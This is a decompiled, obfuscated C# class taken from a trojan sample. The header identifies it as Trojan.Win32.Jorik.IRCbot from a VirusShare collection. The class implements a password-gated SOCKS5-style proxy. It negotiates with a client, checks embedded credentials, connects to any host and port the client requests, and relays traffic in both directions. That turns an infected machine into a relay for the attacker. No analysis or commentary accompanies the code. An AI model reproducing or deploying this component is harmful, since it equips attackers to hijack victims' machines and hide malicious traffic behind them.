// Decompiled with JetBrains decompiler
// Type: .
// Assembly: insomnia, Version=0.0.0.0, Culture=neutral, PublicKeyToken=24b8f1c2e28acde2
// MVID: 0C7B899D-7035-4B2D-B433-3C80E566FC1C
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00001-msil\Trojan.Win32.Jorik.IRCbot.gim-3e8d8a98ac44098acc3d92301b4ae92e5e6e1a5f0b2d861cd9e69e0650edce63.exe

using \u0004;
using \u000E;
using \u000F;
using System;
using System.Net;
using System.Net.Sockets;
using System.Runtime.InteropServices;
using System.Text;

namespace \u000E
{
  internal sealed class \u0003
  {
    private TcpClient \u0001;
    private TcpClient \u0002;
    private byte \u0001 = 5;
    private byte \u0002 = 2;
    private byte \u0003;
    private byte \u0004 = 1;
    private byte \u0005 = 3;
    [NonSerialized]
    internal static \u0008.\u0004 \u008D;

    public \u0003([In] TcpClient obj0) => this.\u0001 = obj0;

    public void \u0001()
    {
      NetworkStream networkStream1 = \u0086\u0002.\u007E\u0013\u0004((object) this.\u0001);
      byte[] numArray1 = new byte[2];
      int num1 = \u008C\u0002.\u007E\u001A\u0004((object) networkStream1, numArray1, 0, 2);
      byte[] numArray2 = new byte[(int) numArray1[1]];
      int num2 = \u008C\u0002.\u007E\u001A\u0004((object) networkStream1, numArray2, 0, numArray2.Length);
      byte[] numArray3 = new byte[2]
      {
        this.\u0001,
        this.\u0002
      };
      \u008D\u0002.\u007E\u001B\u0004((object) networkStream1, numArray3, 0, 2);
      ASCIIEncoding asciiEncoding = new ASCIIEncoding();
      byte[] numArray4 = new byte[64];
      int num3 = \u008C\u0002.\u007E\u001A\u0004((object) networkStream1, numArray4, 0, 64);
      int num4 = \u008E\u0002.\u001C\u0004(numArray4[0]);
      int length1 = \u008E\u0002.\u001C\u0004(numArray4[1]);
      int length2 = \u008E\u0002.\u001C\u0004(numArray4[length1 + 2]);
      byte[] numArray5 = new byte[length1];
      int index1 = 0;
      byte[] numArray6;
      do
      {
        for (; index1 <= length1 - 1; ++index1)
          numArray5[index1] = numArray4[index1 + 2];
        numArray6 = new byte[length2];
      }
      while (false);
      for (int index2 = 0; index2 <= length2 - 1; ++index2)
      {
        if (true)
          numArray6[index2] = numArray4[index2 + length1 + 3];
        else
          goto label_10;
      }
      string str1 = \u0019\u0002.\u007E\u009E\u0003((object) asciiEncoding, numArray5);
      string str2 = \u0019\u0002.\u007E\u009E\u0003((object) asciiEncoding, numArray6);
label_10:
      if (\u0005.\u007E\u0083((object) str1, \u0001.\u0007) && \u0005.\u007E\u0083((object) str2, \u0001.\u0008))
      {
        byte[] numArray7 = new byte[2]
        {
          this.\u0001,
          this.\u0003
        };
        \u008D\u0002.\u007E\u001B\u0004((object) networkStream1, numArray7, 0, 2);
      }
      else
      {
        byte[] numArray8 = new byte[2]
        {
          this.\u0001,
          (byte) 2
        };
        \u008D\u0002.\u007E\u001B\u0004((object) networkStream1, numArray8, 0, 2);
      }
      byte[] numArray9 = new byte[4];
      int num5 = \u008C\u0002.\u007E\u001A\u0004((object) networkStream1, numArray9, 0, 4);
      string hostname = \u0003.\u008D(1628);
      if ((int) numArray9[3] == (int) this.\u0004)
      {
        byte[] address = new byte[4];
        int num6 = \u008C\u0002.\u007E\u001A\u0004((object) networkStream1, address, 0, 4);
        IPAddress ipAddress = new IPAddress(address);
        hostname = \u0003.\u007E\u0005((object) ipAddress);
      }
      else if ((int) numArray9[3] == (int) this.\u0005)
      {
        byte[] numArray10 = new byte[1];
        int num7 = \u008C\u0002.\u007E\u001A\u0004((object) networkStream1, numArray10, 0, 1);
        byte[] numArray11 = new byte[(int) numArray10[0]];
        int num8 = \u008C\u0002.\u007E\u001A\u0004((object) networkStream1, numArray11, 0, (int) numArray10[0]);
        hostname = \u0019\u0002.\u007E\u009E\u0003((object) \u0080.\u008B\u0002(), numArray11);
      }
      if (!\u0007.\u0087(hostname, \u0003.\u008D(1628)))
        return;
      byte[] numArray12 = new byte[2];
      int num9 = \u008C\u0002.\u007E\u001A\u0004((object) networkStream1, numArray12, 0, 2);
      byte[] numArray13 = new byte[2]
      {
        numArray12[1],
        numArray12[0]
      };
      int port = (int) \u008F\u0002.\u001D\u0004(numArray13, 0);
      this.\u0002 = new TcpClient(hostname, port);
      if (!\u008C.\u007E\u000F\u0003((object) this.\u0002))
        return;
      byte[] numArray14 = new byte[10];
      numArray14[0] = this.\u0001;
      numArray14[1] = this.\u0003;
      numArray14[2] = (byte) 0;
      numArray14[3] = (byte) 1;
      string str3 = \u0015.\u007E\u0016\u0002((object) \u0003.\u007E\u0005((object) \u0091\u0002.\u007E\u001F\u0004((object) \u0090\u0002.\u007E\u001E\u0004((object) this.\u0002))), new char[1]
      {
        ':'
      })[0];
      IPAddress ipAddress1 = \u0088.\u0001\u0003(str3);
      numArray14[4] = \u0092\u0002.\u007E\u007F\u0004((object) ipAddress1)[0];
      numArray14[5] = \u0092\u0002.\u007E\u007F\u0004((object) ipAddress1)[1];
      numArray14[6] = \u0092\u0002.\u007E\u007F\u0004((object) ipAddress1)[2];
      numArray14[7] = \u0092\u0002.\u007E\u007F\u0004((object) ipAddress1)[3];
      int num10 = \u0016.\u0018\u0002(\u0015.\u007E\u0016\u0002((object) \u0003.\u007E\u0005((object) \u0091\u0002.\u007E\u001F\u0004((object) \u0090\u0002.\u007E\u001E\u0004((object) this.\u0002))), new char[1]
      {
        ':'
      })[1]);
      numArray14[8] = \u0093\u0002.\u0080\u0004((ushort) num10)[0];
      numArray14[9] = \u0093\u0002.\u0080\u0004((ushort) num10)[1];
      \u008D\u0002.\u007E\u001B\u0004((object) networkStream1, numArray14, 0, 10);
      try
      {
        NetworkStream networkStream2 = \u0086\u0002.\u007E\u0013\u0004((object) this.\u0002);
        bool flag = false;
        while (\u008C.\u007E\u000F\u0003((object) this.\u0002))
        {
          if (\u008C.\u007E\u000F\u0003((object) this.\u0001))
          {
            if (!flag)
            {
              if (\u000E.\u0004.\u0002)
              {
                \u001F.\u0087\u0002(100);
                try
                {
                  if (\u008C.\u007E\u0010\u0003((object) networkStream1))
                  {
                    byte[] numArray15 = new byte[10000];
                    int length3 = \u008C\u0002.\u007E\u001A\u0004((object) networkStream1, numArray15, 0, 10000);
                    byte[] numArray16 = new byte[length3];
                    \u0094\u0002.\u0081\u0004((Array) numArray15, (Array) numArray16, length3);
                    \u008D\u0002.\u007E\u001B\u0004((object) networkStream2, numArray16, 0, numArray16.Length);
                  }
                  if (\u008C.\u007E\u0010\u0003((object) networkStream2))
                  {
                    byte[] numArray17 = new byte[10000];
                    int length4 = \u008C\u0002.\u007E\u001A\u0004((object) networkStream2, numArray17, 0, 10000);
                    byte[] numArray18 = new byte[length4];
                    \u0094\u0002.\u0081\u0004((Array) numArray17, (Array) numArray18, length4);
                    \u008D\u0002.\u007E\u001B\u0004((object) networkStream1, numArray18, 0, numArray18.Length);
                  }
                }
                catch
                {
                  flag = true;
                }
              }
              else
                break;
            }
            else
              break;
          }
          else
            break;
        }
      }
      catch
      {
      }
      if (\u008C.\u007E\u000F\u0003((object) this.\u0001))
        \u0013.\u007E\u0008\u0002((object) this.\u0001);
      if (!\u008C.\u007E\u000F\u0003((object) this.\u0002))
        return;
      \u0013.\u007E\u0008\u0002((object) this.\u0002);
    }

    static \u0003() => \u0005.\u0001(typeof (\u0003));
  }
}
